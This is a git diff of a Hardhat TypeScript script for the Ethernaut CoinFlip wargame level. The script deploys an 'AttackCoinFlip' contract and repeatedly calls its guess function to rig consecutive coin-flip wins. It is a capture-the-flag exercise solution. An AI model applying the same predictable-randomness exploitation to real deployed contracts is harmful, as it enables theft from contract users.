@@ -4,9 +4,9 @@ import { ethers } from "hardhat";
 const attackCoinFlip = async () => {
     // IF THIS FAIL BEFORE REACHING 10 WINS, JUST RERUN UNTIL IT DOES !!!
     // change contract addresses here.
-    const coinFlipAddress = "0xc643a90480bE7c733d8182B8A6d2B3B2074a8402"; //type "await contract.address()" in ethernaut console
+    const coinFlipAddress = "0xB94F42b6D0Bd54E51A6853F2125c5a11C6F7DC60"; //type "await contract.address()" in ethernaut console
     const args: [] = [];
-    const deployer = process.env.PRIVATE_KEY || "";
+    const player = process.env.PRIVATE_KEY || "";
     // [deployer] = await ethers.getSigners();
 
     // Don't touch below 🚀
@@ -19,10 +19,11 @@ const attackCoinFlip = async () => {
     // const deployed = await deployContract(hre, "EternalKing", args);
     // alternative below
     console.log("Deploying attack contract AttackCoinFlip...");
-    const Factory = await ethers.getContractFactory("AttackCoinFlip", deployer);
-    const attackCoinFlip = await Factory.deploy();
-    console.log(attackCoinFlip);
-    console.log(`Contract deployed to ${attackCoinFlip.address}`);
+    const attackContract = await (
+        await ethers.getContractFactory("AttackCoinFlip", player)
+    ).deploy();
+    console.log(attackContract);
+    console.log(`Contract deployed to ${attackContract.address}`);
     console.log("Attack contract deployed...");
     // experimantal verify below
     // if (eternalKing.address){
@@ -40,21 +41,18 @@ const attackCoinFlip = async () => {
     //         }
     //     }
     // }
-
     // typing all commands in console below
-    // DON't FORGET TO DEPLOY 'AttackCoinFlip.sol' first before running this script !!!
-
-    const attack = await ethers.getContractAt("AttackCoinFlip", attackCoinFlip.address);
+    // using coinflip contract from ethernaut
     const contract = await ethers.getContractAt("CoinFlip", coinFlipAddress);
     console.log("Checking consecutive wins, it should be zero...");
     let winsCheck = await contract.consecutiveWins();
     console.log(`Consecutive win is: ${winsCheck}`);
     console.log("Rigging game by predicting result with the attack contract...");
     // TODO: check for lastHash via blockhash and block.number
-    while (winsCheck < 10) {
+    while (winsCheck < 11) {
         const checkWin = await contract.consecutiveWins();
         console.log(`Current consecutiveWin is: ${checkWin}`);
-        const tx = await attack.guess(coinFlipAddress);
+        const tx = await attackContract.guess(coinFlipAddress);
         const txReceipt = await tx.wait(2);
         console.log("Transaction done, aiming for '10' wins...");
         winsCheck = await contract.consecutiveWins();
